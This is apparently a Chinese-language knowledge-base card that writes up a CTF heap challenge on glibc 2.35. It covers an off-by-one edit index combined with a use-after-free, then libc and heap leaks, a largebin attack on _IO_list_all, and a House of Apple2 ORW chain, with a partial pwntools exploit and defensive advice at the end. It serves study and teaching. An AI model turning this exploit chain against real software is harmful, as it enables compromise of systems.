---
id: binary-pwn-heap-edit-oob-freed-largebin-house-of-apple2-orw
title: libc 2.35 菜单堆题：edit 的 num>cnt 越界下标编辑已 free 的 routes[0]，unsorted 泄露 + largebin attack + House of Apple2 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: edit-oob-index-freed-chunk-largebin-house-of-apple2
aliases:
- num > cnt 越界编辑
- route_list[cnt] 未初始化
- delete 不清 routes 指针
- largebin attack _IO_list_all
- House of Apple2 svcudp_reply
- TravelGraph
tags:
- pwn
- heap
- glibc235
- uaf
- out-of-bounds-index
- largebin
- fsop
- house-of-apple2
- io-list-all
- orw
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-08T00:16:21+08:00'
  notes: 已对照原文与全部13张图核对：add malloc(16*(type+80)) 对应 0x510/0x520/0x530 请求（chunk 0x520/0x530/0x540）、note 长度 16*(type+79)（图04/08）；delete 清 from/to 后 free 不清 routes[i]（图05）；edit 收集 route_list[cnt++] 后 num<0||num>cnt 校验、num==cnt 取 routes[route_list[num]]、v7[2]=distance、read 16*(v7[3]+79)（图07）；Dijkstra 距离>2000 置 edit_flag2（图10）；heap 泄露 largebin bk 减 0x1470+0x530、unsorted bin 切割残留泄露 libc 减 0x21ace0、_IO_list_all-0x20 largebin attack、svcudp_reply+0x1a=_IO_wfile_jumps House of Apple2 ORW 均与原文 exp（line 385-467）一致。单卡单一原子（一道题的一条完整利用链），无需拆分。未验证点：未复跑 exp；原文未附 flag 回显，confidence medium；无版本。dedup 与 House of Apple2 chunk-header 卡等为 related 但入口/堆布局不同，作者 --force 理由成立；dup-scan 无本卡 pair。
---

## 一句话结论

菜单堆题的 `delete` 只把结构体的 from/to 清零却不把 `routes[i]` 置空，`edit` 又用 `num < 0 || num > cnt`（应为 `>=`）校验选择序号；当 `num == cnt` 时读到未初始化的 `route_list[cnt]`（实测为 0），使编辑目标落到已释放的 `routes[0]` 上，从而对 largebin freelist 的 fd/bk 字段做受控写，配合 unsorted bin 泄露与 House of Apple2 的 fake wide FILE 在 glibc 2.35 上完成 ORW 读 flag。

## 原理

- 路由结构体（malloc 用户区）：
  ```text
  +0x0  from (int)
  +0x4  to (int)
  +0x8  distance (int)
  +0xc  type (int)        car=1 / train=2 / plane=3
  +0x10 note[]
  ```
  `add()` 按 `malloc(16 * (type + 80))` 分配，car/train/plane 分别请求 0x510/0x520/0x530 字节（chunk 0x520/0x530/0x540），note 读取长度为 `16 * (type + 79)`。
- **delete 制造悬垂指针**：匹配到路由后执行 `*(int*)routes[i] = 0; *(int*)(routes[i]+4) = 0; free(routes[i]);`，但不清空 `routes[i]` 本身。之后 from/to 全为 0，正常 show/edit 无法再匹配到该条目，但该槽位仍指向已释放 chunk。
- **edit 的下标校验缺陷**：
  ```c
  route_list[cnt++] = i;              // 收集所有匹配路由
  ...
  if (num < 0 || num > cnt) exit(1);  // 应为 num >= cnt
  v7 = (_DWORD *)routes[route_list[num]];
  v7[2] = read_num();                 // 写 user+0x8
  read(0, v7 + 4, 16 * (v7[3] + 79)); // 写 user+0x10，长度取自残留 type 字段
  ```
  `num == cnt` 时 `route_list[cnt]` 是未初始化的栈槽（本题为 0），于是 `routes[0]` 被取出；若该槽已被 delete 释放，`v7` 就是指向 freed chunk 用户区的悬垂指针。对 freed largebin chunk 而言，`user+0x8` 是 chunk 的 bk，`user+0x10` 起是 fd_nextsize/bk_nextsize，正好可以改写 largebin 链指针；`read` 长度由 `v7[3]`（bk 高 32 位）决定，实际按发送字节数写入。
- **heap 泄露**：0x520 chunk 释放后，申请 0x540 使其进入 largebin（并再申请一块 0x540 防止与 top 合并）；随后重新申请同大小的 0x520 chunk 复用该槽，`show` 打印 note（`%s`）时可读到 chunk 内残留的 largebin bk（6 字节），减去题目固定偏移（本题 0x1470 + 0x530）得 heapbase。
- **libc 泄露（unsorted bin 切割残留）**：释放相邻的 0x520 与 0x540 chunk 使其合并进 unsorted bin；申请 0x520 切割后，剩余 chunk 内留有 main_arena 的 fd/bk；再释放该 0x520、申请 0x540 并只写 0x510 字节 note（不写 NUL），`show` 的 `%s` 会越过 note 读到残留 libc 指针，减去 main_arena 偏移（本题 0x21ace0）得 libcbase。
- **largebin attack 改 _IO_list_all**：用上述 edit 越界写把已释放 largebin chunk 的 `bk_nextsize` 指向 `_IO_list_all - 0x20`，并预置 fake FILE 地址；再执行一次同 bin 的 malloc/free 触发 largebin 插入，glibc 把可控堆地址写入 `_IO_list_all`，使其指向堆上的 fake wide FILE。
- **House of Apple2**：fake `_IO_FILE` 设置 `_wide_data` 指向堆内 fake `_IO_wide_data`，`_wide_data->_wide_vtable` 指向可控表，表中 `__doallocate` 填魔术 gadget `svcudp_reply + 0x1a`（本题 libc+0x16a06a），vtable 用 `_IO_wfile_jumps`。程序退出/stdio flush 时 `_IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf → call __doallocate`，魔术 gadget 以 FILE 指针为参数做 `leave; ret` 栈迁移，跳到 fake FILE 内预置的 ROP，执行 `open/read/write` 读 flag（无 execve 依赖）。

## 触发条件

- glibc 2.35（Ubuntu 22.04 一类）堆题，分配大小 0x520–0x540，走 largebin/unsorted bin 而非 tcache；
- 存在“删除后不清指针”的悬垂槽，且存在把 `route_list[cnt]` 这类未初始化栈槽当作下标的边界错误（`num > cnt`）；
- edit 的写入长度由 chunk 内残留字段控制，或至少允许对已释放 chunk 进行写；
- 需先满足题目算法门控（Dijkstra 距离 > 2000 时置 `edit_flag2`，本题用 999+999+999 的路由即可）才获得一次 edit 机会。

## 利用步骤

1. 用多段距离 999 的路由构造总长 > 2000 的路径并执行 Dijkstra，解锁 edit。
2. 泄漏 heapbase：释放 0x520 路由 → 申请 0x540 进入 largebin → 申请 0x540 防止 top 合并 → 重新申请 0x520 并 `show`，从 note 之后读出 largebin bk。
3. 泄漏 libcbase：释放相邻 0x520/0x540 进 unsorted bin → 申请 0x520 切割 → 再释放 → 申请 0x540 并用 0x510 字节非 NUL note 填充，`show` 越界读出 main_arena 指针。
4. 在堆上布置 fake FILE/fake wide data/ROP 链（可借多次 add 把 payload 写进已知堆地址）。
5. 构造 `from/to` 使匹配数为 1，调用 edit 时传 `num = cnt = 1`，命中 `routes[0]`（已释放的 largebin chunk）；distance 与 note 分别覆盖 bk/bk_nextsize，把 `bk_nextsize` 指向 `_IO_list_all - 0x20`。
6. 执行一次 plane 的 add 触发 largebin 插入，`_IO_list_all` 被改写成堆地址。
7. 触发 exit/stdio flush 走 House of Apple2，fake FILE 的 `_IO_wfile_overflow` 经 `_IO_wdoallocbuf` 调用 `svcudp_reply+0x1a` 完成栈迁移，执行 ORW ROP 读 flag。

## PoC

```python
# 关键片段（完整交互略；add/delete/show/edit 为菜单封装）
# 1) 解锁 edit：三条 999 距离的路由
add('train', 'guangzhou', 'nanning', 999, b'a')
add('car',   'nanning',  'changsha', 999, b'a')
add('car',   'changsha', 'nanchang', 999, b'a')
d('nanchang')                      # 2997 > 2000，edit_flag2 = 1

# 2) heapbase：释放 0x520 后用 0x540 顶入 largebin，再复用该槽读 bk
delete('nanning', 'changsha')
add('plane', 'fuzhou', 'changsha', 999, b'a')
add('plane', 'changsha', 'guangzhou', 999, b'a')
add('car', 'nanning', 'changsha', 999, b'a' * 8)
show('nanning', 'changsha')
p.recvuntil(b'a' * 8)
heapbase = u64(p.recv(6).ljust(8, b'\x00')) - 0x1470 - 0x530

# 3) libcbase：unsorted bin 切割残留 + 非 NUL note 的 %s 越界读
delete('changsha', 'nanchang')
delete('fuzhou', 'changsha')
add('car', 'changsha', 'nanchang', 999, b'a')
delete('changsha', 'nanchang')
add('plane', 'fuzhou', 'changsha', 999, b'a' * 0x510)
show('fuzhou', 'changsha')
libcbase = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0

# 4) 用 num == cnt 的越界下标编辑已 free 的 routes[0]，触发 largebin attack
target = libcbase + libc.sym['_IO_list_all']
payload = p64(heapbase + 0xa000) + p64(target - 0x20)
edit('guangzhou', 'changsha', 1, 0xfff7f7b110, payload)   # cnt=1, num=1
add('plane', 'guangzhou', 'nanchang', 999, b'a')          # largebin 插入，写 _IO_list_all
```

## 变体与关联

- 变体：`num == cnt` 这类“差一”下标校验可出现在任意 `route_list/tmp_list` 局部数组上；若未初始化槽恰好为 0，则稳定命中 0 号对象。配合“delete 不清指针”即可把任意已释放对象变成可编辑目标。
- 关联：
  - [[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]：同为 glibc 2.35 largebin attack 改 `_IO_list_all` + fake wide FILE ORW；本卡的差异在入口是 `num > cnt` 越界下标 + delete 不清指针的 UAF 写，利用链前段（泄露、堆风水）不同。
  - [[binary-pwn-heap-house-of-apple2-chunk-header-svcudp-reply-xdr-ops-orw]]：同样使用 `svcudp_reply` 魔术 gadget 与 wide FILE 栈迁移；本卡 fake FILE 直接布置在堆块中，不依赖 chunk header 部分覆盖。
  - [[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]：unsorted bin 泄露 libc 的基础原语。

## 检测与防御

- 代码审计：检查所有“收集候选到数组再按序号选择”的接口，边界应为 `>= cnt`；数组元素在使用前必须校验初始化。
- 内存管理：`delete` 后立即把 `routes[i] = NULL`，并在 show/edit 中跳过空槽；free 前后清零整个结构体，避免残留 type/note 被复用。
- 堆加固：使用 safe-linking（glibc 2.32+ 默认）、tcache key 校验；对 largebin 操作可启用更多的完整性检查或迁移到现代 glibc。
- 运行检测：监控对 `_IO_list_all` 的写、异常 wide-vtable 调用；或启用 RELRO/Full RELRO 与 seccomp 限制，但核心仍是修复 UAF 与下标越界。
